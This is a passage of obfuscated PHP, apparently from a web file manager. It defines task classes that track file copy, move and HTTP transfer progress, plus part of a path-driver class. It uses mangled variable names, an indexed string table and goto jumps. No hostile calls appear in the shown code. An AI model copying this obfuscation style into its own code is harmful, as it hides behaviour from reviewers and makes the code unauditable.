•™À–À[$¬ğÕ°Ç”[1674]]; } $this->updateAfter(); $ƒ®ØÔ—µ = 0.2; if (timeFloat() - $ •™À–À[$¬ğÕ°Ç”[1672]] < $ƒ®ØÔ—µ && !$¬™ç¬Ô¦) { return; } $ìİ¡è©ª = self::get($ •™À–À[$¬ğÕ°Ç”[405]]); $±êÄúü‹ = $ìİ¡è©ª[$¬ğÕ°Ç”[767]]; if ($±êÄúü‹ == self::STATYS_KILL) { $†œšğÙù = array($¬ğÕ°Ç”[1683] => LNG($¬ğÕ°Ç”[1684]), $¬ğÕ°Ç”[1201] => !1); Cache::set($¬ğÕ°Ç”[1685] . $this->task[$¬ğÕ°Ç”[405]], $†œšğÙù, 30); $this->onKill(); $this->end(); die; } else { if ($±êÄúü‹ == self::STATYS_STOP) { $ïçÕ¾­Ö = 2; $ìİ¡è©ª[$¬ğÕ°Ç”[1673]] += $ïçÕ¾­Ö; self::valueSet($ •™À–À[$¬ğÕ°Ç”[405]], $ìİ¡è©ª); sleep($ïçÕ¾­Ö); $this->update(); return; } } $ •™À–À[$¬ğÕ°Ç”[767]] = $±êÄúü‹ ? $±êÄúü‹ : $ •™À–À[$¬ğÕ°Ç”[767]]; $ •™À–À[$¬ğÕ°Ç”[1673]] = $ìİ¡è©ª[$¬ğÕ°Ç”[1673]] ? $ìİ¡è©ª[$¬ğÕ°Ç”[1673]] : 0; $ •™À–À[$¬ğÕ°Ç”[1672]] = timeFloat(); Hook::trigger($¬ğÕ°Ç”[1686], $ •™À–À); self::valueSet($ •™À–À[$¬ğÕ°Ç”[405]], $ •™À–À); } public function onKillSet($‰ñ€Ä£°, $•¦«ÑğÍ = array()) { $this->onKillCall = array($‰ñ€Ä£°, $•¦«ÑğÍ); } public function onKill() { $¨‚Õ¸ ’ =& $_SERVER[¯µç›È¢]; self::log($¨‚Õ¸ ’[1680] . $this->task[$¨‚Õ¸ ’[405]] . $¨‚Õ¸ ’[1687]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¼©È—øç) { $”…øûÅÎ =& $_SERVER[¯µç›È¢]; Cache::set($”…øûÅÎ[1685] . $this->task[$”…øûÅÎ[405]], $¼©È—øç, 60); return $¼©È—øç; } public static function get($’¬–¸›) { $éÜ½äãş =& $_SERVER[¯µç›È¢]; $¸âİ„’ï = self::valueGet($’¬–¸›); if (is_array($¸âİ„’ï) && $¸âİ„’ï[$éÜ½äãş[1688]]) { $º‘üè¡ = ActionApply($¸âİ„’ï[$éÜ½äãş[1688]], array($¸âİ„’ï)); $¸âİ„’ï = is_array($º‘üè¡) ? $º‘üè¡ : $¸âİ„’ï; } return $¸âİ„’ï; } public static function listData() { $ë°ÂŞ«« = self::valueGet(); return array_sort_by($ë°ÂŞ««, $_SERVER[¯µç›È¢][1670], !0); } public static function kill($êêÈ§ƒ€) { return self::changeStatus($êêÈ§ƒ€, self::STATYS_KILL); } public static function stop($ÎåÏ•…›) { return self::changeStatus($ÎåÏ•…›, self::STATYS_STOP); } public static function restart($¡ì«ÍÒÇ) { return self::changeStatus($¡ì«ÍÒÇ, self::STATYS_RUNNING); } public static function killAll() { $¼ÇÌÉ• =& $_SERVER[¯µç›È¢]; $¸Ò³ê¬Õ = self::listData(); foreach ($¸Ò³ê¬Õ as $»ŞÑìÂ) { self::kill($»ŞÑìÂ[$¼ÇÌÉ•[405]]); } sleep(2); foreach ($¸Ò³ê¬Õ as $»ŞÑìÂ) { self::valueSet($»ŞÑìÂ[$¼ÇÌÉ•[405]], !1); } } private static function changeStatus($×†Ô¾ß, $Õ¨ıÌı) { $’ÎÓ—²æ =& $_SERVER[¯µç›È¢]; $š„ãĞ¸å = self::valueGet($×†Ô¾ß); if (!$š„ãĞ¸å) { return !1; } $š„ãĞ¸å[$’ÎÓ—²æ[767]] = $Õ¨ıÌı; self::valueSet($×†Ô¾ß, $š„ãĞ¸å); self::log($’ÎÓ—²æ[1689] . $š„ãĞ¸å[$’ÎÓ—²æ[405]] . $’ÎÓ—²æ[1690] . $Õ¨ıÌı); return !0; } public static function valueGet($Ã¤üĞ®ı = false) { $­©õŞ¾ó =& $_SERVER[¯µç›È¢]; if ($Ã¤üĞ®ı) { $Ù‰İµöŸ = Model($­©õŞ¾ó[450])->where(array($­©õŞ¾ó[105] => $Ã¤üĞ®ı, $­©õŞ¾ó[33] => $­©õŞ¾ó[1083]))->find(); return $Ù‰İµöŸ ? json_decode($Ù‰İµöŸ[$­©õŞ¾ó[382]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ßîàñê = false) { $…»ç©¨ =& $_SERVER[¯µç›È¢]; $°‡×áó = array($…»ç©¨[33] => $…»ç©¨[1083]); if ($ßîàñê) { $°‡×áó[$…»ç©¨[1666]] = $ßîàñê; } $°åö©‹Ö = Model($…»ç©¨[450])->where($°‡×áó)->select(); $°åö©‹Ö = $°åö©‹Ö ? $°åö©‹Ö : array(); foreach ($°åö©‹Ö as $ì€¢ß¡ô => $ı£Ğ”¹) { $°åö©‹Ö[$ì€¢ß¡ô] = json_decode($ı£Ğ”¹[$…»ç©¨[382]], !0); } return $°åö©‹Ö; } public static function valueSet($”ëáÑ°, $£‹­ßá“) { $¶®ïï¶Œ =& $_SERVER[¯µç›È¢]; if (!$£‹­ßá“) { return Model($¶®ïï¶Œ[450])->where(array($¶®ïï¶Œ[105] => $”ëáÑ°, $¶®ïï¶Œ[33] => $¶®ïï¶Œ[1083]))->delete(); } $óØ‚ÓÒ… = json_encode($£‹­ßá“); if (!$óØ‚ÓÒ…) { ob_start(); var_dump($£‹­ßá“); $¸Ğ²‰ = ob_get_clean(); self::log($¶®ïï¶Œ[1691] . json_encode_force($¸Ğ²‰)); } if (!$”ëáÑ° || !$£‹­ßá“[$¶®ïï¶Œ[405]]) { return !1; } $Óöèı¦ê = array($¶®ïï¶Œ[33] => $¶®ïï¶Œ[1083], $¶®ïï¶Œ[1666] => USER_ID, $¶®ïï¶Œ[105] => $”ëáÑ°, $¶®ïï¶Œ[382] => $óØ‚ÓÒ…); $£°ïöı = $¶®ïï¶Œ[1692]; CacheLock::lock($£°ïöı); Model($¶®ïï¶Œ[450])->add($Óöèı¦ê, array(), !0); CacheLock::unlock($£°ïöı); } public static function log($ÜÙ–”¸¾) { if (!GLOBAL_DEBUG) { return; } write_log($ÜÙ–”¸¾, $_SERVER[¯µç›È¢][1693]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ì¶ˆµ Ã =& $_SERVER[¯µç›È¢]; $™¨Å¨­â =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ì¶ˆµ Ã[1694], array($this, $ì¶ˆµ Ã[1695])); Hook::bind($ì¶ˆµ Ã[1225], array($this, $ì¶ˆµ Ã[1696])); Hook::bind($ì¶ˆµ Ã[1697], array($this, $ì¶ˆµ Ã[1698])); Hook::bind($ì¶ˆµ Ã[606], array($this, $ì¶ˆµ Ã[1699])); Hook::bind($ì¶ˆµ Ã[607], array($this, $ì¶ˆµ Ã[1700])); Hook::bind($ì¶ˆµ Ã[609], array($this, $ì¶ˆµ Ã[1701])); Hook::bind($ì¶ˆµ Ã[610], array($this, $ì¶ˆµ Ã[1701])); Hook::bind($ì¶ˆµ Ã[576], array($this, $ì¶ˆµ Ã[1702])); Hook::bind($ì¶ˆµ Ã[573], array($this, $ì¶ˆµ Ã[1702])); Hook::bind($ì¶ˆµ Ã[578], array($this, $ì¶ˆµ Ã[1702])); Hook::bind($ì¶ˆµ Ã[580], array($this, $ì¶ˆµ Ã[1702])); Hook::bind($ì¶ˆµ Ã[582], array($this, $ì¶ˆµ Ã[1702])); Hook::bind($ì¶ˆµ Ã[1703], array($this, $ì¶ˆµ Ã[1704])); Hook::bind($ì¶ˆµ Ã[599], array($this, $ì¶ˆµ Ã[1705])); $this->sourceModelCopyFlag = !1; Hook::bind($ì¶ˆµ Ã[1706], array($this, $ì¶ˆµ Ã[1707])); Hook::bind($ì¶ˆµ Ã[1708], array($this, $ì¶ˆµ Ã[1709])); Hook::bind($ì¶ˆµ Ã[1710], array($this, $ì¶ˆµ Ã[1711])); $™¨Å¨­â[$ì¶ˆµ Ã[1712]] = LNG($ì¶ˆµ Ã[1713]); $™¨Å¨­â[$ì¶ˆµ Ã[1714]] = 0; $™¨Å¨­â[$ì¶ˆµ Ã[1715]] = 0; $™¨Å¨­â[$ì¶ˆµ Ã[1076]] = $ì¶ˆµ Ã[12]; $™¨Å¨­â[$ì¶ˆµ Ã[1716]] = $ì¶ˆµ Ã[12]; $™¨Å¨­â[$ì¶ˆµ Ã[1717]] = 0; $™¨Å¨­â[$ì¶ˆµ Ã[1718]] = 0; $™¨Å¨­â[$ì¶ˆµ Ã[1719]] = 0; if (!$™¨Å¨­â[$ì¶ˆµ Ã[1566]]) { $™¨Å¨­â[$ì¶ˆµ Ã[1566]] = LNG($ì¶ˆµ Ã[1720]); } } protected function endAfter() { $š“íëä =& $_SERVER[¯µç›È¢]; Hook::unbind($š“íëä[1694], array($this, $š“íëä[1695])); Hook::unbind($š“íëä[1225], array($this, $š“íëä[1696])); Hook::unbind($š“íëä[1697], array($this, $š“íëä[1698])); Hook::unbind($š“íëä[606], array($this, $š“íëä[1699])); Hook::unbind($š“íëä[607], array($this, $š“íëä[1700])); Hook::unbind($š“íëä[609], array($this, $š“íëä[1701])); Hook::unbind($š“íëä[610], array($this, $š“íëä[1701])); Hook::unbind($š“íëä[576], array($this, $š“íëä[1702])); Hook::unbind($š“íëä[573], array($this, $š“íëä[1702])); Hook::unbind($š“íëä[578], array($this, $š“íëä[1702])); Hook::unbind($š“íëä[580], array($this, $š“íëä[1702])); Hook::unbind($š“íëä[582], array($this, $š“íëä[1702])); Hook::unbind($š“íëä[1703], array($this, $š“íëä[1704])); Hook::unbind($š“íëä[599], array($this, $š“íëä[1705])); Hook::unbind($š“íëä[1706], array($this, $š“íëä[1707])); Hook::unbind($š“íëä[1708], array($this, $š“íëä[1709])); Hook::unbind($š“íëä[1710], array($this, $š“íëä[1711])); } public function copyMoveStart($±¼Ì¸¿, $ëÅœÀ§£, $Áò’íğ’, $šˆàÃíŒ) { $Ó€Êç =& $_SERVER[¯µç›È¢]; self::log($Ó€Êç[1721] . $ëÅœÀ§£ . $Ó€Êç[80] . $šˆàÃíŒ); $ôõ¡Ï³¨ = rtrim(TEMP_FILES, $Ó€Êç[8]); if (substr($ëÅœÀ§£, 0, strlen($ôõ¡Ï³¨)) == $ôõ¡Ï³¨) { return; } if (substr($šˆàÃíŒ, 0, strlen($ôõ¡Ï³¨)) == $ôõ¡Ï³¨) { return; } $¯ÍŸ²×Š =& $this->task; $¯ÍŸ²×Š[$Ó€Êç[1722]] = KodIO::transferType($±¼Ì¸¿, $Áò’íğ’); $this->update(); } public function updateAfter() { $Â‘õ®¡Ç =& $_SERVER[¯µç›È¢]; $¥ÏŒ¥ =& $this->task; if (!$¥ÏŒ¥[$Â‘õ®¡Ç[780]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¥ÏŒ¥[$Â‘õ®¡Ç[1722]] == $Â‘õ®¡Ç[1314]) { return; } self::updateTask($¥ÏŒ¥); } private static function updateTask(&$Ïç’ù¶) { $¬óó«¢ç =& $_SERVER[¯µç›È¢]; if ($Ïç’ù¶[$¬óó«¢ç[1722]] == $¬óó«¢ç[1209] || $Ïç’ù¶[$¬óó«¢ç[1722]] == $¬óó«¢ç[118]) { if ($Ïç’ù¶[$¬óó«¢ç[1716]]) { $Ïç’ù¶[$¬óó«¢ç[1719]] = $Ïç’ù¶[$¬óó«¢ç[1718]] + $Ïç’ù¶[$¬óó«¢ç[1715]]; } } else { if ($Ïç’ù¶[$¬óó«¢ç[1722]] == $¬óó«¢ç[1315]) { if ($Ïç’ù¶[$¬óó«¢ç[1716]] == $¬óó«¢ç[1209]) { $Ïç’ù¶[$¬óó«¢ç[1719]] = $Ïç’ù¶[$¬óó«¢ç[1718]] + $Ïç’ù¶[$¬óó«¢ç[1715]] * 0.5; } else { if ($Ïç’ù¶[$¬óó«¢ç[1716]] == $¬óó«¢ç[118]) { $Ïç’ù¶[$¬óó«¢ç[1719]] = $Ïç’ù¶[$¬óó«¢ç[1718]] + $Ïç’ù¶[$¬óó«¢ç[1714]] * 0.5 + $Ïç’ù¶[$¬óó«¢ç[1715]] * 0.5; } } } } $Ïç’ù¶[$¬óó«¢ç[1668]] = $Ïç’ù¶[$¬óó«¢ç[1719]] / $Ïç’ù¶[$¬óó«¢ç[780]]; if ($Ïç’ù¶[$¬óó«¢ç[1668]] > 0) { $”æãÖÃ„ = timeFloat() - $Ïç’ù¶[$¬óó«¢ç[1670]] - $Ïç’ù¶[$¬óó«¢ç[1673]]; $Ïç’ù¶[$¬óó«¢ç[1674]] = $”æãÖÃ„ * (1 - $Ïç’ù¶[$¬óó«¢ç[1668]]) / $Ïç’ù¶[$¬óó«¢ç[1668]]; } } public function addPath($êÂ¼«Î‰) { $Û¯Äâ° =& $_SERVER[¯µç›È¢]; if (!$êÂ¼«Î‰) { return; } $Ùî™Ëğö =& $this->task; $ü—…³ŒÌ = IO::infoWithChildren($êÂ¼«Î‰); $‚¼ˆ’² = $Ùî™Ëğö[$Û¯Äâ°[1723]] ? $Ùî™Ëğö[$Û¯Äâ°[1723]][$Û¯Äâ°[1724]] : 0; $Ùî™Ëğö[$Û¯Äâ°[1723]] = array($Û¯Äâ°[1724] => $‚¼ˆ’² + 1, $Û¯Äâ°[426] => $ü—…³ŒÌ[$Û¯Äâ°[32]], $Û¯Äâ°[88] => $ü—…³ŒÌ[$Û¯Äâ°[88]], $Û¯Äâ°[524] => $ü—…³ŒÌ[$Û¯Äâ°[524]] ? $ü—…³ŒÌ[$Û¯Äâ°[524]] : $ü—…³ŒÌ[$Û¯Äâ°[88]]); if ($ü—…³ŒÌ[$Û¯Äâ°[33]] == $Û¯Äâ°[206]) { $Ùî™Ëğö[$Û¯Äâ°[803]] += 1; } else { $Ùî™Ëğö[$Û¯Äâ°[803]] += $ü—…³ŒÌ[$Û¯Äâ°[93]][$Û¯Äâ°[91]]; if ($ü—…³ŒÌ[$Û¯Äâ°[408]]) { $Ùî™Ëğö[$Û¯Äâ°[803]] += $ü—…³ŒÌ[$Û¯Äâ°[93]][$Û¯Äâ°[92]] + 1; } } $Ùî™Ëğö[$Û¯Äâ°[780]] += $ü—…³ŒÌ[$Û¯Äâ°[90]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($à»÷Ü¡ã) { $áÒ¥…óÒ =& $_SERVER[¯µç›È¢]; $ÒõÈ¢‹˜ =& $this->task; $ÒõÈ¢‹˜[$áÒ¥…óÒ[1712]] = $à»÷Ü¡ã[$áÒ¥…óÒ[32]]; $ÒõÈ¢‹˜[$áÒ¥…óÒ[1076]] = $à»÷Ü¡ã[$áÒ¥…óÒ[32]]; $this->update(); } public function copyFileStart($Ø¯ªä¬š, $“ı½„Ğã, $‘£¤¤ì, $µñ÷…œ, $£´†„Ûà, $âñ ÚÍ‹) { $Å†¬ª„ =& $_SERVER[¯µç›È¢]; $—³ …ÔÏ = $£´†„Ûà; if ($—³ …ÔÏ == $GLOBALS[$Å†¬ª„[1725]]) { $—³ …ÔÏ = $GLOBALS[$Å†¬ª„[1726]]; } $GLOBALS[$Å†¬ª„[1726]] = $£´†„Ûà; $GLOBALS[$Å†¬ª„[1725]] = $âñ ÚÍ‹; $³Ç¦ÉŠš =& $this->task; $³Ç¦ÉŠš[$Å†¬ª„[1712]] = $—³ …ÔÏ; $³Ç¦ÉŠš[$Å†¬ª„[1714]] = (int) $Ø¯ªä¬š->size($“ı½„Ğã); $³Ç¦ÉŠš[$Å†¬ª„[1715]] = 0; $³Ç¦ÉŠš[$Å†¬ª„[1076]] = $Å†¬ª„[12]; $³Ç¦ÉŠš[$Å†¬ª„[1716]] = $Å†¬ª„[12]; $³Ç¦ÉŠš[$Å†¬ª„[1717]] = 0; $‰·ı°ÎŠ = $³Ç¦ÉŠš[$Å†¬ª„[1714]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($³Ç¦ÉŠš[$Å†¬ª„[405]] . $Å†¬ª„[1727]); if ($‰·ı°ÎŠ && file_exists(get_path_father($µñ÷…œ))) { Cache::set($³Ç¦ÉŠš[$Å†¬ª„[405]] . $Å†¬ª„[1727], $µñ÷…œ); $³Ç¦ÉŠš[$Å†¬ª„[1688]] = array($Å†¬ª„[1728], $Å†¬ª„[1729]); } $this->update(0, $‰·ı°ÎŠ); } public static function updateCopyLocalFileSize($Ãá¼õé) { $ŸÜÁÁ÷Ÿ =& $_SERVER[¯µç›È¢]; $³‚¦Ùš = Cache::get($Ãá¼õé[$ŸÜÁÁ÷Ÿ[405]] . $ŸÜÁÁ÷Ÿ[1727]); if (!$³‚¦Ùš || !file_exists($³‚¦Ùš)) { return $Ãá¼õé; } $Ãá¼õé[$ŸÜÁÁ÷Ÿ[1715]] = @filesize($³‚¦Ùš); $Ãá¼õé[$ŸÜÁÁ÷Ÿ[1719]] += $Ãá¼õé[$ŸÜÁÁ÷Ÿ[1715]]; self::updateTask($Ãá¼õé); return $Ãá¼õé; } public function copyFileEnd($‰ÏûÕ, $œ¸ƒüŸñ, $´³ìéß†, $ıÛéçÔœ, $¯¥ÃçÌ, $íƒ¦±èª) { $–åšøçù =& $_SERVER[¯µç›È¢]; $­èˆäıû =& $this->task; $­èˆäıû[$–åšøçù[1715]] = $­èˆäıû[$–åšøçù[1714]]; $­èˆäıû[$–åšøçù[1716]] = $–åšøçù[12]; unset($­èˆäıû[$–åšøçù[1688]]); if ($¯¥ÃçÌ == $­èˆäıû[$–åšøçù[1712]]) { $­èˆäıû[$–åšøçù[1718]] += $­èˆäıû[$–åšøçù[1714]]; $­èˆäıû[$–åšøçù[1719]] = $­èˆäıû[$–åšøçù[1718]]; $this->update(1); } else { $this->update(); $­èˆäıû[$–åšøçù[1715]] = 0; } Cache::remove($­èˆäıû[$–åšøçù[405]] . $–åšøçù[1727]); self::log($–åšøçù[1730] . $œ¸ƒüŸñ . $–åšøçù[80] . $ıÛéçÔœ . $–åšøçù[66] . $¯¥ÃçÌ . $–åšøçù[1731] . $­èˆäıû[$–åšøçù[1712]]); } public function updateFileEnd($™×”Âáè, $„Å˜“•Ä) { $¨æÖ÷æØ =& $_SERVER[¯µç›È¢]; $ëı‹ÑİŞ =& $this->task; $ëı‹ÑİŞ[$¨æÖ÷æØ[1712]] = $™×”Âáè; $ëı‹ÑİŞ[$¨æÖ÷æØ[1714]] = $„Å˜“•Ä; $ëı‹ÑİŞ[$¨æÖ÷æØ[1718]] += $„Å˜“•Ä; $ëı‹ÑİŞ[$¨æÖ÷æØ[1719]] = $ëı‹ÑİŞ[$¨æÖ÷æØ[1718]]; $this->update(1); self::log($¨æÖ÷æØ[1732] . $™×”Âáè); } public function sourceModelCopy($ß‘¶›‘) { $íÍµÚÈ» =& $_SERVER[¯µç›È¢]; $Æåìá§ = $ß‘¶›‘[0]; $ú·áº‘û = $ß‘¶›‘[1]; $×‹ìê­Å =& $this->task; $this->sourceModelCopyFlag = !0; $öˆ÷ = 0; switch ($Æåìá§) { case $íÍµÚÈ»[574]: $öˆ÷ = 1; break; case $íÍµÚÈ»[577]: $×‹ìê­Å[$íÍµÚÈ»[1712]] = $ú·áº‘û[$íÍµÚÈ»[32]]; break; case $íÍµÚÈ»[579]: $öˆ÷ = intval($ß‘¶›‘[$íÍµÚÈ»[388]] * 0.4); break; case $íÍµÚÈ»[581]: $öˆ÷ = intval($ß‘¶›‘[$íÍµÚÈ»[388]] * 0.2); break; case $íÍµÚÈ»[583]: $öˆ÷ = intval($ß‘¶›‘[$íÍµÚÈ»[388]] * 0.4); break; } $this->update($öˆ÷); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ìğø¡‹Ù, $£¯Ï™Ó¡) { $šáñš® =& $_SERVER[¯µç›È¢]; $this->sourceModelCopyFlag = !0; $óÛåŸİû = 1; if (isset($ìğø¡‹Ù[$šáñš®[93]])) { $óÛåŸİû = $ìğø¡‹Ù[$šáñš®[93]][$šáñš®[91]] + $ìğø¡‹Ù[$šáñš®[93]][$šáñš®[92]] + 1; } $this->update($óÛåŸİû); $this->sourceModelCopyFlag = !1; } public function sourceMove($’¦¯Û«÷) { $this->sourceRemove($’¦¯Û«÷, !1); } public function curlProgress($¯©ãĞÇò, $˜ÂÓÛ, $Öåéøš®, $²óºÍ¶¸, $şªÑõ¼¸) { $‰“ÁššŸ =& $_SERVER[¯µç›È¢]; $ÎÖÕªã´ =& $this->task; if ($şªÑõ¼¸ > 0) { $ÎÖÕªã´[$‰“ÁššŸ[1076]] = $‰“ÁššŸ[1733]; $ÎÖÕªã´[$‰“ÁššŸ[1716]] = $‰“ÁššŸ[118]; if ($ÎÖÕªã´[$‰“ÁššŸ[1714]]) { $ÎÖÕªã´[$‰“ÁššŸ[1715]] = $şªÑõ¼¸; } if ($ÎÖÕªã´[$‰“ÁššŸ[1717]]) { $ÎÖÕªã´[$‰“ÁššŸ[1715]] = $şªÑõ¼¸ + $ÎÖÕªã´[$‰“ÁššŸ[1717]]; } } else { if ($Öåéøš® > 0) { if ($ÎÖÕªã´[$‰“ÁššŸ[1714]] == $˜ÂÓÛ) { $ÎÖÕªã´[$‰“ÁššŸ[1715]] = $Öåéøš®; $ÎÖÕªã´[$‰“ÁššŸ[1076]] = $‰“ÁššŸ[1734]; $ÎÖÕªã´[$‰“ÁššŸ[1716]] = $‰“ÁššŸ[1209]; } } } $this->update(); } public function curlProgressStart($¹Ã‘¯§) { } public function curlProgressEnd($¡×‰ ) { $¿Í­¶ =& $_SERVER[¯µç›È¢]; $¨ë–›‡Ã =& $this->task; $–İîãŠ = curl_getinfo($¡×‰ ); $ô¦à¯’¢ = $–İîãŠ[$¿Í­¶[1735]]; if ($ô¦à¯’¢ == -1) { $ô¦à¯’¢ = $–İîãŠ[$¿Í­¶[1736]]; } if ($¨ë–›‡Ã[$¿Í­¶[1716]] == $¿Í­¶[118] && $ô¦à¯’¢) { $¨ë–›‡Ã[$¿Í­¶[1717]] += $ô¦à¯’¢; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $´Ãë““ =& $_SERVER[¯µç›È¢]; $«ÚÃÑü =& $this->task; $«ÚÃÑü[$´Ãë““[1737]] = 1; Hook::bind($´Ãë““[1706], array($this, $´Ãë““[1738])); Hook::bind($´Ãë““[1708], array($this, $´Ãë““[1739])); Hook::bind($´Ãë““[1710], array($this, $´Ãë““[1740])); } protected function endAfter() { $ÌãŒßÒõ =& $_SERVER[¯µç›È¢]; Hook::unbind($ÌãŒßÒõ[1706], array($this, $ÌãŒßÒõ[1738])); Hook::unbind($ÌãŒßÒõ[1708], array($this, $ÌãŒßÒõ[1739])); Hook::unbind($ÌãŒßÒõ[1710], array($this, $ÌãŒßÒõ[1740])); } public function progressStart($Àé¨™Û„) { $Â±ĞÆœ‡ =& $_SERVER[¯µç›È¢]; $œå±Ï¡À = curl_getinfo($Àé¨™Û„); self::log($Â±ĞÆœ‡[1741] . $œå±Ï¡À[$Â±ĞÆœ‡[315]]); self::valueSet($this->task[$Â±ĞÆœ‡[405]], $this->task); } public function progressEnd($Ç ±éûÇ) { $Œ Øò‡ =& $_SERVER[¯µç›È¢]; self::log($Œ Øò‡[1742] . $this->task[$Œ Øò‡[405]]); $this->end(); } public function progress($É›Ãğ¼£, $™è¯ğ±¦, $¿”™Œ§ç, $¤Š ‚, $çÏ”Éü) { $ÉîÊ»Â» =& $_SERVER[¯µç›È¢]; $ú«©äá =& $this->task; if ($çÏ”Éü > 0) { $ú«©äá[$ÉîÊ»Â»[803]] = $ú«©äá[$ÉîÊ»Â»[803]] == 0 ? $¤Š ‚ : $ú«©äá[$ÉîÊ»Â»[803]]; $ú«©äá[$ÉîÊ»Â»[1667]] = $çÏ”Éü; } else { if ($¿”™Œ§ç > 0) { $ú«©äá[$ÉîÊ»Â»[803]] = $ú«©äá[$ÉîÊ»Â»[803]] == 0 ? $™è¯ğ±¦ : $ú«©äá[$ÉîÊ»Â»[803]]; $ú«©äá[$ÉîÊ»Â»[1667]] = $¿”™Œ§ç; } } $this->update(); self::log("\x70\x72\x6f\147\x72\x65\x73\x73\x48\164\x74\x70\x3a\144\x6f\167\x6e\72{$¿”™Œ§ç}\x2f{$™è¯ğ±¦}\73\x20\x75\x70\154\x6f\141\144\72{$çÏ”Éü}\57{$¤Š ‚}\x3b"); } } goto cÂäÇó”‘Ë; fÛêâªÁ”“: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $Ú¤§¥õÇ =& $_SERVER[¯µç›È¢]; $this->objectDriver = array($Ú¤§¥õÇ[70], $Ú¤§¥õÇ[71], $Ú¤§¥õÇ[72], $Ú¤§¥õÇ[73], $Ú¤§¥õÇ[74], $Ú¤§¥õÇ[75], $Ú¤§¥õÇ[76], $Ú¤§¥õÇ[77], $Ú¤§¥õÇ[78]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ÂšÂ Ïğ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ÂšÂ Ïğ, $_SERVER[¯µç›È¢][8]); } return $ÂšÂ Ïğ; } public function iconvApp($ş“È®à«) { return $ş“È®à«; } public function iconvSystem($¯¤ƒæ—) { return $¯¤ƒæ—; } public function iconvTo($©Ì®¬œê, $¢ÃÅ×Ó¹, $œÄ¥€ìú) { $·¿½«Õí =& $_SERVER[¯µç›È¢]; if (!$©Ì®¬œê || !function_exists($·¿½«Õí[79])) { return $©Ì®¬œê; } static $‚¢©Æİµ = array(); $ãàÚ¨€ó = $¢ÃÅ×Ó¹ . $·¿½«Õí[80] . $œÄ¥€ìú . $·¿½«Õí[81] . $©Ì®¬œê; if (isset($‚¢©Æİµ[$ãàÚ¨€ó])) { return $‚¢©Æİµ[$ãàÚ¨€ó]; } if (function_exists($·¿½«Õí[82])) { $Ä•‡õ¡Ã = @mb_convert_encoding($©Ì®¬œê, $œÄ¥€ìú, $¢ÃÅ×Ó¹); } else { $Ä•‡õ¡Ã = @iconv($¢ÃÅ×Ó¹, $œÄ¥€ìú, $©Ì®¬œê); } $Ä•‡õ¡Ã = $Ä•‡õ¡Ã ? $Ä•‡õ¡Ã : $©Ì®¬œê; if (strstr($Ä•‡õ¡Ã, $·¿½«Õí[83])) { $Ä•‡õ¡Ã = str_replace($·¿½«Õí[83], $·¿½«Õí[11], $Ä•‡õ¡Ã); } $‚¢©Æİµ[$¢ÃÅ×Ó¹ . $·¿½«Õí[80] . $œÄ¥€ìú . $·¿½«Õí[81] . $©Ì®¬œê] = $Ä•‡õ¡Ã; $‚¢©Æİµ[$œÄ¥€ìú . $·¿½«Õí[80] . $¢ÃÅ×Ó¹ . $·¿½«Õí[81] . $©Ì®¬œê] = $©Ì®¬œê; $‚¢©Æİµ[$œÄ¥€ìú . $·¿½«Õí[80] . $¢ÃÅ×Ó¹ . $·¿½«Õí[81] . $Ä•‡õ¡Ã] = $©Ì®¬œê; $‚¢©Æİµ[$¢ÃÅ×Ó¹ . $·¿½«Õí[80] . $œÄ¥€ìú . $·¿½«Õí[81] . $Ä•‡õ¡Ã] = $Ä•‡õ¡Ã; return $Ä•‡õ¡Ã; } public function getPathInner($«ìì÷¤) { $õ¿è±ş¡ = IO::init($«ìì÷¤); return $õ¿è±ş¡->path; } public function getPathOuter($şóÓÇö±) { $„™Ê¼šä =& $_SERVER[¯µç›È¢]; $ĞºÄÔÀ» = strlen(trim($this->pathBase, $„™Ê¼šä[8])); $şóÓÇö± = substr(trim($şóÓÇö±, $„™Ê¼šä[8]), $ĞºÄÔÀ»); return $this->pathDriver . $„™Ê¼šä[8] . ltrim($şóÓÇö±, $„™Ê¼šä[8]); } public function isParentOf($ÈÍøú¢³, $¨Ç±Â–) { $¬˜æ£ Ï =& $_SERVER[¯µç›È¢]; $ÈÍøú¢³ = rtrim(strtolower($ÈÍøú¢³), $¬˜æ£ Ï[8]) . $¬˜æ£ Ï[8]; $¨Ç±Â– = rtrim(strtolower($¨Ç±Â–), $¬˜æ£ Ï[8]) . $¬˜æ£ Ï[8]; $ÍüÏ»Ï³ = strpos($¨Ç±Â–, $ÈÍøú¢³) === 0; return $ÍüÏ»Ï³; } public function getType() { $Øà§±ë¯ =& $_SERVER[¯µç›È¢]; $ªº®¹’˜ = str_replace($Øà§±ë¯[84], $Øà§±ë¯[12], get_class($this)); return strtolower($ªº®¹’˜); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($³à‹€ßå, $‡›Œ§“) { $›ô“Ùıó =& $_SERVER[¯µç›È¢]; $â³À—Èå = rtrim($³à‹€ßå, $›ô“Ùıó[8]) . $›ô“Ùıó[8] . $‡›Œ§“; $ÎºÑ»Şä = $this->exist($â³À—Èå); return $ÎºÑ»Şä ? $â³À—Èå : !1; } public function setModifyTime($¢«±˜á—, $¡½—Îì£ = '') { } public function renameObject($‡ò£—¾–, $ü‘›¡Ø®) { $êˆä›—á =& $_SERVER[¯µç›È¢]; $çÉá¾ëä = $ü‘›¡Ø®; Hook::trigger($êˆä›—á[85], $this, $‡ò£—¾–, $this, $this->pathFather($‡ò£—¾–) . $ü‘›¡Ø®); $‡ò£—¾– = $this->getPathOuter($‡ò£—¾–); $ü‘›¡Ø® = $this->pathFather($‡ò£—¾–) . $ü‘›¡Ø®; if (IO::isFile($‡ò£—¾–)) { $Íãòò„¤ = 